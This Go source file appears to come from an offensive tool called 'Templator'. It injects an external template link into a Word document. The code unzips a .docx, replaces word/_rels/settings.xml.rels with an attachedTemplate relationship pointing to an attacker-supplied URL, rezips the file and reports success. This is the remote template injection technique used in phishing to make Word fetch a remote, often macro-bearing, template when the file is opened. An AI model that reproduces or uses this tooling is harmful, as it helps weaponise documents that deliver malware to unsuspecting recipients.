package Manager

import (
	"Templator/Packages/Colors"
	"Templator/Packages/Converters"
	"Templator/Packages/Output"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"time"
)

var xmlWordTemplate string = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="%s" TargetMode="External" />
</Relationships>
`

// Inject2Template function
func Inject2Template(fileType string, input string, output string, link string) {
	logger := log.New(os.Stderr, "[!] ", 0)
	switch fileType {
	case "docx":
		// Call function named Inject2TemplateDocx
		Inject2TemplateOffice(input, output, link, "docx")
	case "xlsx":
		// Call function named Inject2TemplateXlsx
		//Inject2TemplateOffice(input, output, link, "xlsx")
	default:
		logger.Fatal("The file type is not supported.")
	}
}

// Inject2TemplateOffice function
func Inject2TemplateOffice(input string, output string, link string, statement string) {
	logger := log.New(os.Stderr, "[!] ", 0)

	// Call function named CreateBackup
	Converters.CreateBackup(input)

	// Rename the .docx file to .zip
	zipArchive := input + ".zip"

	// Record the start time
	CreationStartTime := time.Now()

	err := os.Rename(input, zipArchive)
	if err != nil {
		logger.Fatal("Error: ", err)
	}

	// Call function named RemoveExtension
	folderName := Converters.RemoveExtension(input)

	// Extract the contents of the .docx file to the folder
	if err := Converters.Unzip(zipArchive, folderName); err != nil {
		logger.Fatal("Error: ", err)
	}

	// Remove the original zip archive
	if err := os.Remove(zipArchive); err != nil {
		logger.Fatal("Error: ", err)
	}

	// Set xmlFile path
	xmlFilePath := folderName + "\\word\\_rels\\settings.xml.rels"

	// Attempt to remove the file
	err = os.Remove(xmlFilePath)
	if err != nil {
		logger.Fatal("Error: ", err)
	}

	// Create a new file and write the template with the target value
	err = ioutil.WriteFile(xmlFilePath, []byte(fmt.Sprintf(xmlWordTemplate, link)), 0644)
	if err != nil {
		logger.Fatal("Error: ", err)
	}

	// Call function named CreateZipArchive
	Converters.CreateZipArchive(folderName, zipArchive)

	// Remove the folder
	if err := os.RemoveAll(folderName); err != nil {
		logger.Fatal("Error: ", err)
	}

	// Record the end time
	CreationEndTime := time.Now()

	// Calculate the duration
	CreationDuration := CreationEndTime.Sub(CreationStartTime)

	if input != output {
		// Call function named SetOutput
		Output.SetOutput(zipArchive, output)
	} else {
		// Call function named SetOutput
		Output.SetOutput(zipArchive, input)
	}

	fmt.Printf("[+] MS Office template document successfully created!\n\n[+] Saved to %s\n\n[+] Completed in %s\n\n", Colors.BoldRed(output), CreationDuration)
}
